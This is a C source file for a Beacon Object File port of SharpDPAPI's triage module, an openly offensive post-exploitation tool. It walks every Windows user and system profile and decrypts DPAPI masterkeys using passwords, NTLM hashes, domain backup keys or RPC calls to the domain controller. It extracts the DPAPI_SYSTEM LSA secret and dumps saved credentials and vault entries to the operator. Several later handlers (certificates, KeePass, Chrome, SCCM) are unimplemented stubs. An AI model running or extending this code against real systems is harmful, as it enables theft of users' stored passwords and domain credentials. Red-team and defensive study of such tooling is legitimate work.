/*
 * triage.c — File system triage operations for DPAPI artifacts
 * Ported from SharpDPAPI/lib/Triage.cs
 *
 * Handles enumerating and triaging masterkeys, credentials,
 * vaults, certificates, and application-specific DPAPI data.
 */
#include "triage.h"
#include "lsadump.h"
#include "bkrp.h"
#include "beacon.h"

/* ---- Internal: read file into buffer ---- */
static BOOL read_file_bytes(const wchar_t* path, BYTE** out_data, int* out_len) {
    HANDLE hFile;
    DWORD size, read;

#ifdef BOF
    hFile = KERNEL32$CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                                  OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    size = KERNEL32$GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE || size == 0) {
        KERNEL32$CloseHandle(hFile);
        return FALSE;
    }

    *out_data = (BYTE*)intAlloc(size);
    if (!*out_data) { KERNEL32$CloseHandle(hFile); return FALSE; }

    if (!KERNEL32$ReadFile(hFile, *out_data, size, &read, NULL) || read != size) {
        intFree(*out_data);
        *out_data = NULL;
        KERNEL32$CloseHandle(hFile);
        return FALSE;
    }

    KERNEL32$CloseHandle(hFile);
#else
    hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                         OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE || size == 0) { CloseHandle(hFile); return FALSE; }

    *out_data = (BYTE*)intAlloc(size);
    if (!*out_data) { CloseHandle(hFile); return FALSE; }

    if (!ReadFile(hFile, *out_data, size, &read, NULL) || read != size) {
        intFree(*out_data);
        *out_data = NULL;
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);
#endif

    *out_len = (int)size;
    return TRUE;
}

/* ---- Internal: enumerate files in a directory ---- */
typedef void (*FILE_CALLBACK)(const wchar_t* full_path, void* ctx);

static void enumerate_files(const wchar_t* dir, const wchar_t* pattern,
                            FILE_CALLBACK callback, void* ctx) {
    wchar_t search[MAX_PATH * 2];
    swprintf(search, L"%s\\%s", dir, pattern ? pattern : L"*");

    WIN32_FIND_DATAW ffd;
    HANDLE hFind;

#ifdef BOF
    hFind = KERNEL32$FindFirstFileW(search, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0) continue;

        wchar_t full_path[MAX_PATH * 2];
        swprintf(full_path, L"%s\\%s", dir, ffd.cFileName);
        if (callback) callback(full_path, ctx);
    } while (KERNEL32$FindNextFileW(hFind, &ffd));
    KERNEL32$FindClose(hFind);
#else
    hFind = FindFirstFileW(search, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0) continue;

        wchar_t full_path[MAX_PATH * 2];
        swprintf(full_path, L"%s\\%s", dir, ffd.cFileName);
        if (callback) callback(full_path, ctx);
    } while (FindNextFileW(hFind, &ffd));
    FindClose(hFind);
#endif
}

/* ---- Internal: enumerate subdirectories ---- */
static void enumerate_dirs(const wchar_t* dir, FILE_CALLBACK callback, void* ctx) {
    wchar_t search[MAX_PATH * 2];
    swprintf(search, L"%s\\*", dir);

    WIN32_FIND_DATAW ffd;
    HANDLE hFind;

#ifdef BOF
    hFind = KERNEL32$FindFirstFileW(search, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0) continue;

        wchar_t full_path[MAX_PATH * 2];
        swprintf(full_path, L"%s\\%s", dir, ffd.cFileName);
        if (callback) callback(full_path, ctx);
    } while (KERNEL32$FindNextFileW(hFind, &ffd));
    KERNEL32$FindClose(hFind);
#else
    hFind = FindFirstFileW(search, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0) continue;

        wchar_t full_path[MAX_PATH * 2];
        swprintf(full_path, L"%s\\%s", dir, ffd.cFileName);
        if (callback) callback(full_path, ctx);
    } while (FindNextFileW(hFind, &ffd));
    FindClose(hFind);
#endif
}

/* ============================================================
 * Masterkey Triage Context
 * ============================================================ */

typedef struct {
    MASTERKEY_CACHE* cache;
    const BYTE* pvk;
    int pvk_len;
    const char* password;
    const char* ntlm;
    const char* credkey;
    BOOL use_rpc;
    const wchar_t* dc_name;  /* DC for RPC calls */
    const char* sid;
    BOOL hashes_only;
    int processed;
    int decrypted;
} MK_TRIAGE_CTX;

/* ---- Callback: process a single masterkey file ---- */
static void triage_masterkey_file_cb(const wchar_t* path, void* ctx) {
    MK_TRIAGE_CTX* tc = (MK_TRIAGE_CTX*)ctx;
    BYTE* data = NULL;
    int data_len = 0;

    if (!read_file_bytes(path, &data, &data_len)) return;
    tc->processed++;

    /* Parse the masterkey file */
    BYTE* mk_bytes = NULL;
    BYTE* bk_bytes = NULL;
    BYTE* dk_bytes = NULL;
    int mk_len = 0, bk_len = 0, dk_len = 0;
    GUID mk_guid;

    if (!parse_masterkey_file(data, data_len, &mk_bytes, &mk_len,
                              &bk_bytes, &bk_len, &dk_bytes, &dk_len, &mk_guid)) {
        intFree(data);
        return;
    }

    if (tc->hashes_only && mk_bytes) {
        /* Output hash format only */
        char* sid = tc->sid ? (char*)tc->sid : extract_sid_from_path(path);
        if (sid && mk_bytes) {
            char* hash = format_hash(mk_bytes, mk_len, sid);
            if (hash) {
                BeaconPrintf(CALLBACK_OUTPUT, "%s\n", hash);
                intFree(hash);
            }
        }
        if (sid != tc->sid && sid) intFree(sid);
    }

    /* Try to decrypt with each available key */
    BYTE sha1[20];
    BOOL decrypted = FALSE;

    /* Try PVK (domain backup key) first */
    if (!decrypted && tc->pvk && tc->pvk_len > 0 && dk_bytes && dk_len > 0) {
        /* Use domain key from the masterkey file with PVK */
        /* This involves RSA decryption of the domain key section */
        /* Simplified: try the domain key path */
        if (decrypt_masterkey_with_sha(mk_bytes, mk_len, tc->pvk, tc->pvk_len, sha1)) {
            decrypted = TRUE;
        }
    }

    /* Try password */
    if (!decrypted && tc->password) {
        char* sid = tc->sid ? (char*)tc->sid : extract_sid_from_path(path);
        if (sid) {
            BYTE* pre_key = NULL;
            int pk_len = 0;
            if (derive_pre_key(tc->password, sid, FALSE, 1, &pre_key, &pk_len)) {
                if (decrypt_masterkey(mk_bytes, mk_len, pre_key, pk_len, sha1))
                    decrypted = TRUE;
                intFree(pre_key);
            }
            /* Also try NTLM-based pre-key */
            if (!decrypted) {
                if (derive_pre_key(tc->password, sid, FALSE, 2, &pre_key, &pk_len)) {
                    if (decrypt_masterkey(mk_bytes, mk_len, pre_key, pk_len, sha1))
                        decrypted = TRUE;
                    intFree(pre_key);
                }
            }
            if (sid != tc->sid) intFree(sid);
        }
    }

    /* Try NTLM hash directly */
    if (!decrypted && tc->ntlm) {
        int ntlm_len = 0;
        BYTE* ntlm_bytes = hex_to_bytes(tc->ntlm, &ntlm_len);
        if (ntlm_bytes && ntlm_len == 16) {
            char* sid = tc->sid ? (char*)tc->sid : extract_sid_from_path(path);
            if (sid) {
                BYTE pre_key[20];
                if (hmac_sha1(ntlm_bytes, 16, (BYTE*)sid, strlen(sid), pre_key)) {
                    if (decrypt_masterkey(mk_bytes, mk_len, pre_key, 20, sha1))
                        decrypted = TRUE;
                }
                if (sid != tc->sid) intFree(sid);
            }
            intFree(ntlm_bytes);
        }
    }

    /* Try RPC (MS-BKRP) — ask the DC to decrypt the domain key */
    if (!decrypted && tc->use_rpc && tc->dc_name) {
        BYTE* dk = NULL;
        int dkl = 0;
        if (dpapi_get_domain_key(data, data_len, &dk, &dkl)) {
            BYTE rpc_key[64];
            int rpc_len = 0;
            if (bkrp_decrypt_masterkey(tc->dc_name, dk, dkl, rpc_key, &rpc_len)) {
                /* Hash the 64-byte plaintext key to get the SHA1 */
                sha1_hash(rpc_key, rpc_len, sha1);
                decrypted = TRUE;
            }
            intFree(dk);
        }
    }

    if (decrypted) {
        /* Add to cache */
        mk_cache_add(tc->cache, &mk_guid, sha1);
        tc->decrypted++;

        char* guid_str = guid_to_string(&mk_guid);
        char* sha1_hex = bytes_to_hex(sha1, 20);
        if (guid_str && sha1_hex) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] %s : %s\n", guid_str, sha1_hex);
        }
        if (guid_str) intFree(guid_str);
        if (sha1_hex) intFree(sha1_hex);
    }

    if (mk_bytes) intFree(mk_bytes);
    if (bk_bytes) intFree(bk_bytes);
    if (dk_bytes) intFree(dk_bytes);
    intFree(data);
}

/* ============================================================
 * Main Triage Functions
 * ============================================================ */

BOOL triage_user_masterkeys(MASTERKEY_CACHE* cache,
                            const BYTE* pvk, int pvk_len,
                            const char* password,
                            const char* ntlm,
                            const char* credkey,
                            BOOL use_rpc,
                            const wchar_t* target,
                            const wchar_t* server,
                            BOOL hashes_only,
                            const char* sid) {
    MK_TRIAGE_CTX ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.cache = cache;
    ctx.pvk = pvk;
    ctx.pvk_len = pvk_len;
    ctx.password = password;
    ctx.ntlm = ntlm;
    ctx.credkey = credkey;
    ctx.use_rpc = use_rpc;
    ctx.hashes_only = hashes_only;
    ctx.sid = sid;
    ctx.dc_name = NULL;

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging user masterkeys...\n");

    /* If RPC mode, discover the DC */
    wchar_t* dc_alloc = NULL;
    if (use_rpc) {
        PDOMAIN_CONTROLLER_INFOW dci = NULL;
        DWORD rc;
#ifdef BOF
        rc = NETAPI32$DsGetDcNameW(NULL, NULL, NULL, NULL, 0, &dci);
#else
        rc = DsGetDcNameW(NULL, NULL, NULL, NULL, 0, &dci);
#endif
        if (rc == 0 && dci && dci->DomainControllerName) {
            /* DomainControllerName is like "\\DC01" — skip leading backslashes */
            wchar_t* name = dci->DomainControllerName;
            while (*name == L'\\') name++;
            int len = wcslen(name);
            dc_alloc = (wchar_t*)intAlloc((len + 1) * sizeof(wchar_t));
            if (dc_alloc) {
                memcpy(dc_alloc, name, len * sizeof(wchar_t));
                dc_alloc[len] = 0;
                ctx.dc_name = dc_alloc;
            }
#ifdef BOF
            NETAPI32$NetApiBufferFree(dci);
#else
            NetApiBufferFree(dci);
#endif
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Using DC: %S for RPC masterkey decryption\n", ctx.dc_name);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to discover DC (err 0x%08X). /rpc requires domain membership.\n", rc);
        }
    }

    /* Get all user profile directories */
    int user_count = 0;
    wchar_t** users = get_user_folders(&user_count);

    for (int i = 0; i < user_count; i++) {
        wchar_t mk_path[MAX_PATH * 2];
        swprintf(mk_path, L"%s\\AppData\\Roaming\\Microsoft\\Protect", users[i]);

        /* For each SID directory, triage masterkey files */
        WIN32_FIND_DATAW ffd;
        wchar_t search[MAX_PATH * 2];
        swprintf(search, L"%s\\S-1-5-*", mk_path);

        HANDLE hFind;
#ifdef BOF
        hFind = KERNEL32$FindFirstFileW(search, &ffd);
#else
        hFind = FindFirstFileW(search, &ffd);
#endif
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;

                wchar_t sid_path[MAX_PATH * 2];
                swprintf(sid_path, L"%s\\%s", mk_path, ffd.cFileName);

                /* Extract SID from directory name */
                char* user_sid = wide_to_utf8(ffd.cFileName);
                ctx.sid = user_sid;

                BeaconPrintf(CALLBACK_OUTPUT, "\n[*] User: %s (%s)\n",
                             user_sid ? user_sid : "?",
                             wide_to_utf8(users[i]));

                enumerate_files(sid_path, NULL, triage_masterkey_file_cb, &ctx);

                if (user_sid) intFree(user_sid);

#ifdef BOF
            } while (KERNEL32$FindNextFileW(hFind, &ffd));
            KERNEL32$FindClose(hFind);
#else
            } while (FindNextFileW(hFind, &ffd));
            FindClose(hFind);
#endif
        }
    }

    /* Free user folders */
    for (int i = 0; i < user_count; i++) {
        intFree(users[i]);
    }
    if (users) intFree(users);
    if (dc_alloc) intFree(dc_alloc);

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Processed %d masterkey files, decrypted %d\n",
                 ctx.processed, ctx.decrypted);

    return (ctx.decrypted > 0);
}

/* ---- System masterkey triage ---- */
BOOL triage_system_masterkeys(MASTERKEY_CACHE* cache) {
    /*
     * System masterkeys are at:
     *   C:\Windows\System32\Microsoft\Protect\S-1-5-18\
     * Key is DPAPI_SYSTEM LSA secret
     */
    BYTE* dpapi_key = NULL;
    int key_len = 0;

    if (!is_high_integrity()) {
        BeaconPrintf(CALLBACK_ERROR, "[!] System masterkey triage requires high integrity\n");
        return FALSE;
    }

    if (!get_dpapi_keys(&dpapi_key, &key_len)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to retrieve DPAPI_SYSTEM key\n");
        return FALSE;
    }

    /* DPAPI_SYSTEM: [4 version][20 machine key][20 user key] */
    BYTE* machine_key = dpapi_key + 4;   /* 20 bytes */
    BYTE* user_key = dpapi_key + 24;      /* 20 bytes */

    char* mk_hex = bytes_to_hex(machine_key, 20);
    char* uk_hex = bytes_to_hex(user_key, 20);
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] DPAPI_SYSTEM machine key: %s\n", mk_hex ? mk_hex : "?");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] DPAPI_SYSTEM user key:    %s\n", uk_hex ? uk_hex : "?");
    if (mk_hex) intFree(mk_hex);
    if (uk_hex) intFree(uk_hex);

    /* Triage system masterkeys */
    wchar_t system_path[] = L"C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18";

    MK_TRIAGE_CTX ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.cache = cache;
    /* For system masterkeys, the key is the HMAC-SHA1 of DPAPI_SYSTEM key */
    ctx.pvk = dpapi_key;
    ctx.pvk_len = key_len;

    enumerate_files(system_path, NULL, triage_masterkey_file_cb, &ctx);

    intFree(dpapi_key);

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] System masterkeys: processed %d, decrypted %d\n",
                 ctx.processed, ctx.decrypted);

    return (ctx.decrypted > 0);
}

/* ============================================================
 * Credential Triage
 * ============================================================ */

typedef struct {
    MASTERKEY_CACHE* cache;
    int found;
} CRED_TRIAGE_CTX;

static void triage_cred_file_cb(const wchar_t* path, void* ctx) {
    CRED_TRIAGE_CTX* tc = (CRED_TRIAGE_CTX*)ctx;
    BYTE* data = NULL;
    int data_len = 0;

    if (!read_file_bytes(path, &data, &data_len)) return;

    char* path_str = wide_to_utf8(path);
    BeaconPrintf(CALLBACK_OUTPUT, "\n  CredFile     : %s\n", path_str ? path_str : "?");
    if (path_str) intFree(path_str);

    describe_credential(data, data_len, tc->cache, NULL);
    tc->found++;

    intFree(data);
}

BOOL triage_cred_file(MASTERKEY_CACHE* cache, const wchar_t* file_path) {
    CRED_TRIAGE_CTX ctx = { cache, 0 };
    triage_cred_file_cb(file_path, &ctx);
    return (ctx.found > 0);
}

BOOL triage_cred_folder(MASTERKEY_CACHE* cache, const wchar_t* folder) {
    CRED_TRIAGE_CTX ctx = { cache, 0 };
    enumerate_files(folder, NULL, triage_cred_file_cb, &ctx);
    return (ctx.found > 0);
}

BOOL triage_user_creds(MASTERKEY_CACHE* cache,
                       const wchar_t* target,
                       const wchar_t* server) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging user credentials...\n");

    int user_count = 0;
    wchar_t** users = get_user_folders(&user_count);

    for (int i = 0; i < user_count; i++) {
        wchar_t cred_path[MAX_PATH * 2];
        swprintf(cred_path, L"%s\\AppData\\Roaming\\Microsoft\\Credentials", users[i]);
        triage_cred_folder(cache, cred_path);

        /* Also check Local\Credentials */
        swprintf(cred_path, L"%s\\AppData\\Local\\Microsoft\\Credentials", users[i]);
        triage_cred_folder(cache, cred_path);
    }

    for (int i = 0; i < user_count; i++) intFree(users[i]);
    if (users) intFree(users);

    return TRUE;
}

BOOL triage_system_creds(MASTERKEY_CACHE* cache) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging system credentials...\n");

    wchar_t path[] = L"C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials";
    return triage_cred_folder(cache, path);
}

/* ============================================================
 * Vault Triage
 * ============================================================ */

BOOL triage_vault_folder(MASTERKEY_CACHE* cache, const wchar_t* folder) {
    /* Read Policy.vpol first, then credential files */
    wchar_t vpol_path[MAX_PATH * 2];
    swprintf(vpol_path, L"%s\\Policy.vpol", folder);

    BYTE* vpol_data = NULL;
    int vpol_len = 0;
    BYTE* aes128 = NULL;
    BYTE* aes256 = NULL;

    if (read_file_bytes(vpol_path, &vpol_data, &vpol_len)) {
        describe_vault_policy(vpol_data, vpol_len, cache, &aes128, &aes256, NULL);
        intFree(vpol_data);
    }

    /* Enumerate .vcrd files */
    WIN32_FIND_DATAW ffd;
    wchar_t search[MAX_PATH * 2];
    swprintf(search, L"%s\\*.vcrd", folder);

    HANDLE hFind;
#ifdef BOF
    hFind = KERNEL32$FindFirstFileW(search, &ffd);
#else
    hFind = FindFirstFileW(search, &ffd);
#endif
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            wchar_t vcrd_path[MAX_PATH * 2];
            swprintf(vcrd_path, L"%s\\%s", folder, ffd.cFileName);

            BYTE* data = NULL;
            int data_len = 0;
            if (read_file_bytes(vcrd_path, &data, &data_len)) {
                describe_vault_cred(data, data_len, aes128, aes256, NULL);
                intFree(data);
            }
#ifdef BOF
        } while (KERNEL32$FindNextFileW(hFind, &ffd));
        KERNEL32$FindClose(hFind);
#else
        } while (FindNextFileW(hFind, &ffd));
        FindClose(hFind);
#endif
    }

    if (aes128) intFree(aes128);
    if (aes256) intFree(aes256);

    return TRUE;
}

BOOL triage_user_vaults(MASTERKEY_CACHE* cache,
                        const wchar_t* target,
                        const wchar_t* server) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging user vaults...\n");

    int user_count = 0;
    wchar_t** users = get_user_folders(&user_count);

    for (int i = 0; i < user_count; i++) {
        wchar_t vault_path[MAX_PATH * 2];
        swprintf(vault_path, L"%s\\AppData\\Roaming\\Microsoft\\Vault", users[i]);

        /* Each vault is in a {GUID} subdirectory */
        enumerate_dirs(vault_path, (FILE_CALLBACK)triage_vault_folder, cache);

        swprintf(vault_path, L"%s\\AppData\\Local\\Microsoft\\Vault", users[i]);
        enumerate_dirs(vault_path, (FILE_CALLBACK)triage_vault_folder, cache);
    }

    for (int i = 0; i < user_count; i++) intFree(users[i]);
    if (users) intFree(users);

    return TRUE;
}

BOOL triage_system_vaults(MASTERKEY_CACHE* cache) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging system vaults...\n");

    wchar_t path[] = L"C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Vault";
    enumerate_dirs(path, (FILE_CALLBACK)triage_vault_folder, cache);
    return TRUE;
}

/* ============================================================
 * Certificate / KeePass / RDCMan / PS stubs (Phase 3)
 * ============================================================ */

BOOL triage_user_certs(MASTERKEY_CACHE* cache, const wchar_t* target,
                       const wchar_t* server, BOOL show_all) {
    /* TODO: Phase 3 */
    return FALSE;
}

BOOL triage_system_certs(MASTERKEY_CACHE* cache, const wchar_t* target,
                         BOOL show_all) {
    /* TODO: Phase 3 */
    return FALSE;
}

BOOL triage_cert_folder(MASTERKEY_CACHE* cache, const wchar_t* folder,
                        BOOL show_all) {
    return FALSE;
}

BOOL triage_cert_file(MASTERKEY_CACHE* cache, const wchar_t* file_path,
                      BOOL show_all) {
    return FALSE;
}

BOOL triage_keepass(MASTERKEY_CACHE* cache, const wchar_t* target,
                    BOOL unprotect) {
    return FALSE;
}

BOOL triage_keepass_key_file(MASTERKEY_CACHE* cache, const wchar_t* file_path,
                             BOOL unprotect) {
    return FALSE;
}

BOOL triage_rdcman(MASTERKEY_CACHE* cache, const wchar_t* target,
                   BOOL unprotect) {
    return FALSE;
}

BOOL triage_rdcman_file(MASTERKEY_CACHE* cache, const wchar_t* file_path,
                        BOOL unprotect) {
    return FALSE;
}

BOOL triage_rdg_folder(MASTERKEY_CACHE* cache, const wchar_t* folder,
                       BOOL unprotect) {
    return FALSE;
}

BOOL triage_rdg_file(MASTERKEY_CACHE* cache, const wchar_t* file_path,
                     BOOL unprotect) {
    return FALSE;
}

BOOL triage_ps_cred_file(MASTERKEY_CACHE* cache, const wchar_t* file_path,
                         BOOL unprotect) {
    return FALSE;
}

BOOL display_cred_profile(const wchar_t* file_path, const char* username,
                          const char* password_enc) {
    return FALSE;
}

/* ============================================================
 * Chrome / Search / SCCM stubs (Phase 5)
 * ============================================================ */

BOOL triage_chrome_logins(MASTERKEY_CACHE* cache,
                          const wchar_t* target, const wchar_t* server,
                          BOOL unprotect,
                          const BYTE* state_key, int state_key_len) {
    /* TODO: Phase 5 — parse Chrome Login Data SQLite */
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Chrome logins triage (not yet implemented)\n");
    return FALSE;
}

BOOL triage_chrome_cookies(MASTERKEY_CACHE* cache,
                           const wchar_t* target, const wchar_t* server,
                           BOOL unprotect,
                           const BYTE* state_key, int state_key_len,
                           const char* cookie_regex, const char* url_regex) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Chrome cookies triage (not yet implemented)\n");
    return FALSE;
}

BOOL triage_chrome_statekeys(MASTERKEY_CACHE* cache,
                             const wchar_t* target, const wchar_t* server,
                             BOOL unprotect) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Chrome state keys triage (not yet implemented)\n");
    return FALSE;
}

BOOL triage_search(MASTERKEY_CACHE* cache,
                   const wchar_t* target, const wchar_t* server,
                   const char* pattern) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] DPAPI blob search (not yet implemented)\n");
    return FALSE;
}

BOOL triage_sccm(MASTERKEY_CACHE* cache, const wchar_t* target) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] SCCM credential triage (not yet implemented)\n");
    return FALSE;
}

BOOL triage_user_full(MASTERKEY_CACHE* cache,
                      const BYTE* pvk, int pvk_len,
                      const char* password, const char* ntlm,
                      const char* credkey, BOOL use_rpc,
                      const wchar_t* target, const wchar_t* server,
                      BOOL show_all) {
    /* Full user triage: masterkeys + creds + vaults + certs */
    triage_user_masterkeys(cache, pvk, pvk_len, password, ntlm,
                           credkey, use_rpc, target, server, FALSE, NULL);

    if (cache->count == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] No masterkeys decrypted — cannot proceed with triage\n");
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] --- User Credentials ---\n");
    triage_user_creds(cache, target, server);

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] --- User Vaults ---\n");
    triage_user_vaults(cache, target, server);

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] --- User Certificates ---\n");
    triage_user_certs(cache, target, server, show_all);

    return TRUE;
}

